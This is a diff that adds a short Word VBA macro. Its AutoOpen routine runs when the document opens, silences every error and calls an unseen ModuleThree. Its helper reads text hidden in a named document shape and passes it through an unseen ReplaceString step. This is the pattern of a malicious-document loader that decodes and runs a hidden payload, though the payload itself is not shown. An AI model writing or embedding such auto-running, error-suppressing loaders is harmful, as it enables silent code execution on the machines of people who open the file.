@@ -1,0 +1,13 @@
+Sub AutoOpen()
+On Error Resume Next
+
+ModuleThree
+
+End Sub
+
+Function shapestring(shapename)
+
+blob = ActiveDocument.Shapes(shapename).TextFrame.TextRange.Text
+shapestring = ReplaceString(blob)
+
+End Function
